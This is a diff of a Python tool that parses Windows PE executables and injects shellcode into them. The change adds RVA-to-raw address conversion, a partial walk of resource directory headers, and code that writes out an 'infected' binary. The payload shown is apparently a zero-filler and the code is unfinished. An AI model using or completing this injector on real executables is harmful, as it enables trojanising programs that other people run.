@@ -19,10 +19,10 @@ OFFSET_TO_FILE_ALIGNMENT = 0x3C
 OFFSET_TO_SIZE_OF_IMAGE = 0x50
 
 
-OFFSET_TO_DATA_DIRECTORIES_HEADER = 0x78
 SIZE_OF_DATA_DIRECTORY_HEADER_ENTRY =  0x8
 DATA_DIRECTORIES_HEADER_SIZE = 0x10
 
+OFFSET_TO_RESOURCE_TABLE_RVA = 0x88
 OFFSET_TO_BEGINNING_OF_SECTION_HEADERS = 0xF8
 
 
@@ -41,6 +41,12 @@ def get_dword_given_offset(binary_data, offset):
            (binary_data[offset + 2] << 2 * BITS_PER_BYTE) + \
            (binary_data[offset + 3] << 3 * BITS_PER_BYTE)
 
+
+def get_word_given_offset(binary_data, offset):
+    return binary_data[offset] + (binary_data[offset + 1] << BITS_PER_BYTE)
+
+
+
 def set_dword_given_offset(binary_data, dword, offset):
 
     binary_data[offset] = (dword & 0xFF)
@@ -54,35 +60,34 @@ def get_pe_header_offset(binary_data):
 
     return get_dword_given_offset(binary_data, OFFSET_TO_PE_HEADER_OFFSET)
 
-
-def get_raw_entrypoint_offset(header_offset, binary_data):
-
-    entrypoint_rva_offset = header_offset + OFFSET_TO_ENTRYPOINT_RVA
-    entrypoint_rva = get_dword_given_offset(binary_data, entrypoint_rva_offset)
-
+def convert_rva_to_raw(binary_data, header_offset, rva):
+    print(hex(rva))
 
     number_of_sections_offset = header_offset + OFFSET_TO_NUMBER_OF_SECTIONS
-    number_of_sections = binary_data[number_of_sections_offset] + (binary_data[number_of_sections_offset + 1] << BITS_PER_BYTE)
+    number_of_sections = get_word_given_offset(binary_data, number_of_sections_offset)
     current_header_offset = header_offset + OFFSET_TO_BEGINNING_OF_SECTION_HEADERS
+    for section_index in range(0, number_of_sections):
 
-    for section_index in range(0,number_of_sections):
+        virtual_section_size_offset = current_header_offset + OFFSET_TO_SECTION_VIRTUAL_SIZE_WITHIN_SECTION_HEADER
+        virtual_section_size = get_dword_given_offset(binary_data, virtual_section_size_offset)
 
-       virtual_section_size_offset = current_header_offset + OFFSET_TO_SECTION_VIRTUAL_SIZE_WITHIN_SECTION_HEADER
-       virtual_section_size = get_dword_given_offset(binary_data, virtual_section_size_offset)
+        virtual_section_rva_offset = current_header_offset + OFFSET_TO_SECTION_VIRTUAL_ADDRESS_WITHIN_SECTION_HEADER
+        virtual_section_rva = get_dword_given_offset(binary_data, virtual_section_rva_offset)
 
-       virtual_section_rva_offset = current_header_offset + OFFSET_TO_SECTION_VIRTUAL_ADDRESS_WITHIN_SECTION_HEADER
-       virtual_section_rva = get_dword_given_offset(binary_data, virtual_section_rva_offset)
+        virtual_end_of_section_rva = virtual_section_rva + virtual_section_size
 
-       virtual_end_of_section_rva = virtual_section_rva + virtual_section_size
+        if (rva >= virtual_section_rva) and (rva < virtual_end_of_section_rva):
+            print(section_index)
+            print(hex(virtual_section_rva))
+            raw_section_offset_offset = current_header_offset + OFFSET_TO_SECTION_RAW_ADDRESS_WITHIN_SECTION_HEADER
+            raw_section_offset = get_dword_given_offset(binary_data, raw_section_offset_offset)
 
-       if entrypoint_rva >= virtual_section_rva and entrypoint_rva <= virtual_end_of_section_rva:
-           raw_section_offset_offset = current_header_offset + OFFSET_TO_SECTION_RAW_ADDRESS_WITHIN_SECTION_HEADER
-           raw_section_offset = get_dword_given_offset(binary_data, raw_section_offset_offset)
+            return rva - virtual_section_rva + raw_section_offset
+
+        current_header_offset += SECTION_HEADER_SIZE
 
 
-           return entrypoint_rva - virtual_section_rva + raw_section_offset
 
-       current_header_offset += SECTION_HEADER_SIZE
 
 '''
     Bad solution. Temporary.
@@ -95,6 +100,44 @@ def inject_shell_code_at_offset(binary_data, offset, shell_code):
     first_half.extend(shell_code)
     first_half.extend(second_half)
     return first_half
+
+#I am assuming that the Offsets to directories stat with 8.
+#Must check if rsrs comes after exec section before adding shellcode size.
+def adjust_resource_headers(binary_data, offset_to_resource_section, shell_code_size):
+
+    OFFSET_TO_NUMBER_OF_ID_ENTRIES_WITHIN_RESOURCE_DIRECTORY_HEADER = 0xE
+    offset_to_number_of_id_entries_within_resource_directory_type = offset_to_resource_section + OFFSET_TO_NUMBER_OF_ID_ENTRIES_WITHIN_RESOURCE_DIRECTORY_HEADER
+    print(hex(offset_to_number_of_id_entries_within_resource_directory_type))
+    number_of_id_entries_within_resource_directory_type = get_word_given_offset(binary_data,offset_to_number_of_id_entries_within_resource_directory_type)
+    print(hex(number_of_id_entries_within_resource_directory_type))
+
+    pointer_to_offset_to_directory_for_id_entry_within_resource_directory_type = offset_to_number_of_id_entries_within_resource_directory_type + 0x2
+
+
+    for id_entry_within_resource_directory_type in range(0, number_of_id_entries_within_resource_directory_type):
+
+
+        offset_to_offset_to_directory_of_a_type_within_nameid = pointer_to_offset_to_directory_for_id_entry_within_resource_directory_type +  0x4
+
+        offset_to_directory_of_a_type_within_nameid = 0x7FFFFFFF & get_dword_given_offset(binary_data, offset_to_offset_to_directory_of_a_type_within_nameid)
+        offset_to_number_of_id_entries_within_nameid = offset_to_resource_section + offset_to_directory_of_a_type_within_nameid + OFFSET_TO_NUMBER_OF_ID_ENTRIES_WITHIN_RESOURCE_DIRECTORY_HEADER
+        number_of_id_entries_within_nameid = get_word_given_offset(binary_data, offset_to_number_of_id_entries_within_nameid)
+
+        offset_to_offset_of_id_offset_to_directory_for_id_entry_within_nameid = offset_to_number_of_id_entries_within_nameid + 0x2
+
+        for id_entry_within_nameid_language in range(0, number_of_id_entries_within_nameid):
+            offset_to_offset_to_directory_within_language = offset_to_offset_of_id_offset_to_directory_for_id_entry_within_nameid + 0x4
+            OFFSET_TO_OFFSET_TO_DATA_ENTRY_WITHIN_LANGUAGE = 0x14
+
+            offset_to_directory_of_a_type_within_language = 0x7FFFFFFF & get_dword_given_offset(binary_data, offset_to_offset_to_directory_within_language)
+            offset_to_offset_to_data_entry_within_data_entry = offset_to_resource_section + offset_to_directory_of_a_type_within_language + OFFSET_TO_OFFSET_TO_DATA_ENTRY_WITHIN_LANGUAGE
+            offset_to_data_entry_within_data_entry = 0x7FFFFFFF & get_dword_given_offset(binary_data, offset_to_offset_to_data_entry_within_data_entry)
+            offset_to_rva_within_data_entry = offset_to_resource_section + offset_to_data_entry_within_data_entry
+            rva_of_data = get_dword_given_offset(binary_data, offset_to_rva_within_data_entry)
+            #rint(hex(rva_of_data))
+            #set_dword_given_offset(binary_data, rva_of_data + shell_code_size)
+
+
 
 #TODO: Implemente relocation
 #Implement rsrc
@@ -117,15 +160,6 @@ def adjust_headers(binary_data, header_offset, section_header_offset, number_of_
 
     virtual_section_size_offset = section_header_offset + OFFSET_TO_SECTION_VIRTUAL_SIZE_WITHIN_SECTION_HEADER
     virtual_section_size = get_dword_given_offset(binary_data, virtual_section_size_offset)
-
-    data_directories_header_offset = header_offset + OFFSET_TO_DATA_DIRECTORIES_HEADER
-    for data_directory_index in range(0, DATA_DIRECTORIES_HEADER_SIZE):
-        data_directory_rva_offset = data_directories_header_offset + data_directory_index * SIZE_OF_DATA_DIRECTORY_HEADER_ENTRY
-        data_directory_rva = get_dword_given_offset(binary_data, data_directory_rva_offset)
-        if data_directory_rva >= virtual_section_rva + virtual_section_size:
-            print(hex(data_directory_rva))
-            set_dword_given_offset(binary_data, data_directory_rva + shell_code_size, data_directory_rva_offset)
-
 
 
     #Set virtual section size for shellcoded section
@@ -180,7 +214,14 @@ def adjust_headers(binary_data, header_offset, section_header_offset, number_of_
     aligned_size_of_image = unaligned_size_of_image + (section_alignment - (unaligned_size_of_image % section_alignment))
     set_dword_given_offset(binary_data, aligned_size_of_image, size_of_image_offset)
 
+    '''
+            Resources!!!
 
+    '''
+    offset_to_rva_to_resource_table = header_offset + OFFSET_TO_RESOURCE_TABLE_RVA
+    raw_offset_to_resource_table = convert_rva_to_raw(binary_data, header_offset, get_dword_given_offset(binary_data, offset_to_rva_to_resource_table))
+    print(hex(raw_offset_to_resource_table))
+    adjust_resource_headers(binary_data, raw_offset_to_resource_table, shell_code_size)
 
 
 def inject_shell_code(header_offset, binary_data, shell_code):
@@ -236,12 +277,18 @@ if __name__=='__main__':
     header_offset = get_pe_header_offset(binary_data)
 
 
-    raw_entrypoint_offset = get_raw_entrypoint_offset(header_offset, binary_data)
+    entrypoint_rva_offset = header_offset + OFFSET_TO_ENTRYPOINT_RVA
+    entrypoint_rva = get_dword_given_offset(binary_data, entrypoint_rva_offset)
+
+    #raw_entrypoint_offset = convert_rva_to_raw(binary_data,header_offset,entrypoint_rva)
 
     zero_filler = ZeroFiller()
-    infected_binary = inject_shell_code(header_offset,binary_data,zero_filler.get_shell_code())
+    infected_binary = inject_shell_code(header_offset,binary_data, zero_filler.get_shell_code())
     infected_binary_path = BINARIES_PATH+INFECTED_BINARY
-    os.remove(infected_binary_path)
+    try:
+        os.remove(infected_binary_path)
+    except OSError:
+        pass
 
     with open(infected_binary_path, "wb") as f:
         f.write(infected_binary)
